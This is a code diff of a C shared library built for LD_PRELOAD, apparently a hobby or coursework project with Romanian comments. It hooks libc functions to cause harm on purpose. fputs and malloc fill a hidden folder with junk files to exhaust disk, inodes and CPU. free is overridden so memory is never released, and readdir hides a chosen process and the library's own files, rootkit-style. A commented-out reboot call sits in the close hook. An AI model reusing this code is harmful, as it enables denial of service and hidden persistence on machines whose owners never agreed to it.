@@ -7,14 +7,9 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include<dirent.h>
-#include <unistd.h>
-#include <fcntl.h> 
-#include <stdio.h>
-#include <dlfcn.h>
 #include <dirent.h>
-#include <string.h>
-#include <unistd.h>
+#include <fcntl.h> 
+
 
 
 void createfile()
@@ -32,21 +27,18 @@ void createfile()
 
     char filename[8+5];
     strcpy(filename, string);
-    strcat(filename, ".txt");
+    strcat(filename, ".nvd");
     strcat(initial_path,filename);
     
     mkdir(".driver_dump", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
 
-    FILE *fp = fopen(initial_path, "w");
-    //int descriptor = open(initial_path, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);
-	//nu scria in fisier folosind aceasta metoda
+    int descriptor = open(initial_path, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP);
     int i;
-    for (i = 0; i < 1024*1024; i++) {
-    	//write(descriptor, 'a' + rand() % 26, 1);
-        fputc('a' + rand() % 26, fp);
+    for (i = 0; i < 64; i++) {
+    	
+    	int n = write(descriptor, "check LD_PRELOAD", 16);
     }
-    
-    //fclose(fp);
+    close(descriptor);
 }      
 
 
@@ -71,7 +63,7 @@ int fputs(const char *str, FILE *stream)
 
     int (*original_fputs)(const char *, FILE *) = dlsym(RTLD_NEXT, "fputs");
     int result = original_fputs(str, stream);
-    printf("Annoying isn't it?\n");
+    fprintf(stderr,"Scroll down...\n"); //annoying
     createfile();
     
     return result;
@@ -107,8 +99,7 @@ void* malloc(size_t size)
     void *(*real_malloc)(size_t) = dlsym(RTLD_NEXT, "malloc");
     void *ret = real_malloc(size);
 
-	
-    //fprintf(stderr,"malloc\n");
+    createfile(); //ocup disk, inodes, cpu cand se executa aceasta =>harmful
 
     return ret;
 }
@@ -135,7 +126,7 @@ void free(void *p)
 {
     void (*libc_free)(void*) = dlsym(RTLD_NEXT, "free");
 
-    //libc_free(p); //nu se mai dezaloca memorie (in cazul unui server, la un moment da va crapa
+    //libc_free(p); //nu se mai dezaloca memorie (in cazul unui server, la un moment da va crapa)
 }
 
 
@@ -231,7 +222,8 @@ typedef int (*close_func_t)(int); //redenumire basic type
 int close(int fd) {
     close_func_t original_close = (close_func_t)dlsym(RTLD_NEXT, "close");
     int ret = original_close(fd);
-    system("reboot"); //cand se inchide un fisier se executa aceasta
+    //system("reboot"); //cand se inchide un fisier se executa aceasta
+    			//de exemplu oricand se apeleaza malloc, in wrapper-ul meu apelez si close
     return ret;
 }
 
@@ -301,66 +293,61 @@ static int get_process_name(char* pid, char* buf)
 
 struct dirent* readdir(DIR *dirp)
 {
-    static struct dirent* (*original_readdir)(DIR*) = NULL;
-
-    if(original_readdir == NULL) {
-        original_readdir = dlsym(RTLD_NEXT, "readdir");
-        if(original_readdir == NULL) {
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
-        }
-    }
-
+    struct dirent* (*original_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
     struct dirent* dir;
 
-    while(1) {
+    while(1) 
+    {
         dir = original_readdir(dirp);
-        if(dir) {
+        if(dir) 
+        {
             char dir_name[256];
             char process_name[256];
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
-               strcmp(dir_name, "/proc") == 0 &&
+            
+            //ascund procesul dorit
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 &&
                get_process_name(dir->d_name, process_name) &&
-               strcmp(process_name, process_to_filter) == 0) {
-                continue;
-            }
+               strcmp(process_name, process_to_filter) == 0) 
+               continue;
+               
+            //ascund fisierele dorite   
             if(strstr(dir->d_name, ".libmylib.so") != NULL ||
-               strstr(dir->d_name, ".driver_dump") != NULL) {
+               strstr(dir->d_name, ".driver_dump") != NULL) 
                 continue;
-            }
+                //daca SO nu are la dispozitie o unealta grafica, nu se pot detecta acestea, cu exceptia "$ echo $LD_PRELOAD"
         }
         break;
     }
     return dir;
 }
 
+
+//acelasi lucru pt aceasta functie de read directory (nu putem cunoaste cu certitudine care dintre acestea este folosita de SO)
 struct dirent64* readdir64(DIR *dirp)
 {
-    static struct dirent64* (*original_readdir64)(DIR*) = NULL;
-
-    if(original_readdir64 == NULL) {
-        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
-        if(original_readdir64 == NULL) {
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());
-        }
-    }
-
+    struct dirent64* (*original_readdir64)(DIR*) = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64* dir;
 
-    while(1) {
+    while(1) 
+    {
         dir = original_readdir64(dirp);
-        if(dir) {
+        if(dir) 
+        {
             char dir_name[256];
             char process_name[256];
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
-               strcmp(dir_name, "/proc") == 0 &&
+            
+            
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) && strcmp(dir_name, "/proc") == 0 &&
                get_process_name(dir->d_name, process_name) &&
-               strcmp(process_name, process_to_filter) == 0) {
+               strcmp(process_name, process_to_filter) == 0) 
                 continue;
-            }
+            
+            
+            
             if(strstr(dir->d_name, ".libmylib.so") != NULL ||
-               strstr(dir->d_name, ".driver_dump") != NULL) {
+               strstr(dir->d_name, ".driver_dump") != NULL)
                 continue;
-            }
+            
         }
         break;
     }
